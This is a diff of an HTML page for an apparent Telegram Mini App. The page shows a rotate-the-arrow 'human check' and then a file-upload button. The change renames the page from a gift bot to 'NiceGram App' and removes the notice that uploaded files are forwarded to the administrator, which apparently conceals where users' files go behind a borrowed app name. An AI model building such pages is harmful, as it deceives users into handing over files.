@@ -2,54 +2,35 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Подарочный бот - Mini App</title>
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <link rel="stylesheet" href="style.css?v=5">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NiceGram App</title>
+    <link rel="stylesheet" href="style.css?v=6">
 </head>
 <body>
-    <!-- Экран проверки -->
     <div class="screen" id="captchaScreen">
         <div class="container">
             <div class="icon">🔒</div>
-            <h1>Подтвердите, что вы человек</h1>
-            <p class="subtitle">Поверните стрелку на 90° вправо</p>
-            
+            <h1>Проверка</h1>
+            <p class="subtitle">Поверните стрелку вправо (80°-99°)</p>
             <div class="rotate-area">
                 <div class="degree-indicator" id="degreeIndicator">0°</div>
-                <div class="rotate-circle" id="rotateCircle">↑</div>
+                <div id="rotateCircle" class="rotate-circle">↑</div>
             </div>
-            
-            <button class="btn primary" id="verifyBtn">
-                ✅ Подтвердить
-            </button>
-            
-            <p class="hint">Простая проверка для защиты от ботов</p>
+            <button class="btn primary" id="verifyBtn">✅ Подтвердить</button>
         </div>
     </div>
-    
-    <!-- Основной экран -->
+
     <div class="screen" id="mainScreen" style="display: none;">
         <div class="container">
             <div class="icon">🎉</div>
             <h1 id="welcomeText">Добро пожаловать!</h1>
-            <p class="subtitle" id="userInfo"></p>
-            
-            <button class="btn" id="sendFileBtn">
-                📤 Отправить файл
-            </button>
-            
-            <input type="file" id="fileInput" class="hidden" multiple>
-            
-            <div class="status" id="status"></div>
-            
-            <p class="hint">
-                Файл будет переслан администратору
-            </p>
+            <button class="btn" id="sendFileBtn">📤 Отправить файл</button>
+            <input type="file" id="fileInput" class="hidden">
+            <div id="status" class="status"></div>
         </div>
     </div>
-    
-    <script src="https://telegram.org/js/telegram-web-app.js?v=1"></script>
-    <script src="script.js?v=5"></script>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="script.js?v=6"></script>
 </body>
 </html>
